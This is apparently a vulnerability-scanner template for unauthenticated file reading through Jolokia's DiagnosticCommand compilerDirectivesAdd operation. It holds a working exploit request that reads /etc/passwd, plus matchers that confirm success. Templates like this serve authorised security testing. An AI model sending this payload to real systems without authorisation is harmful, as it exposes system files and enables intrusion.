id: jolokia-unauthenticated-lfi
info:
  name: jolokia Unauthenticated Lfi
  author: dhiyaneshDk
  severity: high
  description: This exploit allow you to File read with compilerDirectivesAdd
  reference: https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/
  tags: jolokia,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
